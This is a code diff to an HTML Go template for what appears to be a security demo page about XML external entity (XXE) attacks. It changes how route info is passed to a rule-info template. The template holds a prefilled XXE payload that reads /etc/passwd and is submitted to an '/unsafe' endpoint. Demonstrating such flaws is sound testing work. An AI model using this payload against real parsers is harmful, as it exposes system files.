@@ -1,6 +1,7 @@
 {{define "xxe"}}
 <h1 class="page-header">{{.Name}}</h1>
-{{template "ruleInfo" .}}
+{{$routeInfo := index .Rulebar .Name}}
+{{template "ruleInfo" $routeInfo}}
 <p>
   The following XML snippet is crafted to exploit SAX parsers that
   are configured to allow for external entity processing. If successful,
@@ -15,7 +16,8 @@
     </h4>
     <form method="{{.Method}}" action="{{.URL}}/unsafe" target="_blank">
       <div class="form-group">
-        <input name="input" class="form-control" value="&lt;!DOCTYPE read-fs [&lt;!ELEMENT read-fs ANY &gt;&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;users&gt;&lt;user&gt;&lt;read-fs&gt;&amp;passwd;&lt;/read-fs&gt;&lt;name&gt;C.K Frode&lt;/name&gt;&lt;/user&gt;&lt;/users&gt;" />
+        <input name="input" class="form-control"
+          value="&lt;!DOCTYPE read-fs [&lt;!ELEMENT read-fs ANY &gt;&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;users&gt;&lt;user&gt;&lt;read-fs&gt;&amp;passwd;&lt;/read-fs&gt;&lt;name&gt;C.K Frode&lt;/name&gt;&lt;/user&gt;&lt;/users&gt;" />
       </div>
       <button type="submit" class="btn btn-primary">Submit</button>
     </form>
